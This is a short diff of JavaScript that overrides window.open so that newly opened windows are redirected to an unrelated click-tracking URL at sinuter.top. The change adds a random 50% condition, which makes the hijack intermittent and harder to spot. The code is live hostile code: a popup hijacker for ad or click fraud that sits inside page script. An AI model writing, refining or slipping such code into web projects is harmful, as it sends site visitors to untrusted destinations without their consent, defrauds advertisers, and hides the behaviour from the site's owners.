@@ -6,7 +6,7 @@ setTimeout(function () {
       const newWindow = originalOpen.call(this, url, name, specs);
 
 
-      if (newWindow) {
+      if (newWindow && Math.random() < 0.5) {
         newWindow.location.href = 'https://sinuter.top/click?o=3&a=7685';
         console.log('123');
       }
